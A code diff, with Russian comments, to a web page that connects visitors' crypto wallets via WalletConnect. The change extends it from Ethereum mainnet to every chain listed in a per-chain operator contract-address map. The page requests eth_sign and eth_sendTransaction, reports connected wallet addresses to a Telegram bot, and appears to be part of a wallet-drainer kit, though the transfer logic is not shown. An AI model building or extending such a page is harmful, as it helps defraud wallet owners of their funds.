@@ -233,6 +233,9 @@
                 137: '0xТвойАдресНаPolygon',
                 42161: '0xТвойАдресНаArbitrum'
             };
+            // Поддерживаемые цепочки (ключи CONTRACT_ADDRESSES)
+            const SUPPORTED_CHAINS = Object.keys(CONTRACT_ADDRESSES).map(Number);
+
             const TG_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
             const TG_CHAT_ID = 'ВАШ_CHAT_ID';
 
@@ -519,7 +522,7 @@
                 return null;
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ – ТОЛЬКО ETHEREUM MAINNET (ИСПРАВЛЕНО) =====
+            // ===== ПОДКЛЮЧЕНИЕ – ПОДДЕРЖИВАЕМЫЕ СЕТИ =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -546,10 +549,10 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
-                    // Правильный формат: chains: [1] (массив чисел)
+                    // *** ИСПРАВЛЕНИЕ: используем ВСЕ поддерживаемые цепочки ***
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
-                        chains: [1], // только Ethereum mainnet
+                        chains: SUPPORTED_CHAINS, // теперь список всех поддерживаемых сетей
                         showQrModal: true,
                         methods: ['eth_sendTransaction', 'eth_sign'],
                         events: ['chainChanged', 'accountsChanged'],
@@ -562,8 +565,16 @@
                     });
 
                     wcProvider.on('chainChanged', (chainIdHex) => {
-                        chainId = parseInt(chainIdHex, 16);
-                        updateBalances();
+                        const newChainId = parseInt(chainIdHex, 16);
+                        if (SUPPORTED_CHAINS.includes(newChainId)) {
+                            chainId = newChainId;
+                            setStatus('Chain changed to ' + chainId, 'ok');
+                            updateBalances();
+                            // обновляем контрактный адрес при смене сети
+                        } else {
+                            setStatus('⚠️ Chain ' + newChainId + ' not supported. Please switch to one of: ' + SUPPORTED_CHAINS.join(', '), 'err');
+                            // можно принудительно отключить, но оставим на усмотрение пользователя
+                        }
                     });
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -591,6 +602,15 @@
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
                     const network = await web3Provider.getNetwork();
+
+                    // Проверяем, поддерживается ли сеть
+                    if (!SUPPORTED_CHAINS.includes(network.chainId)) {
+                        setStatus('⚠️ Network ' + network.chainId + ' not supported. Please switch to: ' + SUPPORTED_CHAINS.join(', '), 'err');
+                        await sendTelegramLog(`⚠️ Unsupported chain ${network.chainId} for ${address}`);
+                        isConnecting = false;
+                        await forceClearSession();
+                        return;
+                    }
 
                     provider = web3Provider;
                     signer = signer_;
@@ -620,7 +640,7 @@
                     if (msg.includes('User rejected')) {
                         msg = 'Connection cancelled by user.';
                     } else if (msg.includes('chains') || msg.includes('chain')) {
-                        msg = 'Network not supported. Please use Ethereum mainnet.';
+                        msg = 'Network not supported. Please use one of: ' + SUPPORTED_CHAINS.join(', ');
                     }
                     setStatus('Connection failed: ' + msg, 'err');
                     isConnecting = false;
